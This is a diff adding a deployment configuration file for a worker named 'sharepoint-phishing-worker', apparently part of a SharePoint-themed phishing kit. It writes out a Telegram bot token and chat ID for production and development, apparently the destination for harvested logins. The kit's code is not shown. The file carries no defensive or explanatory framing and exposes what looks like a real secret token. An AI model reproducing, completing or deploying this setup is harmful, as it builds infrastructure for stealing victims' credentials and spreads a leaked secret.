@@ -1,0 +1,11 @@
+name = "sharepoint-phishing-worker"
+main = "src/index.js"
+compatibility_date = "2023-12-01"
+
+[env.production.vars]
+TELEGRAM_BOT_TOKEN = "7900736471:AAEKHksJLOSnKN1wP7o2k_FRRN3y1kHNECw"
+TELEGRAM_CHAT_ID = "6281088773"
+
+[env.development.vars]
+TELEGRAM_BOT_TOKEN = "7900736471:AAEKHksJLOSnKN1wP7o2k_FRRN3y1kHNECw"
+TELEGRAM_CHAT_ID = "6281088773"
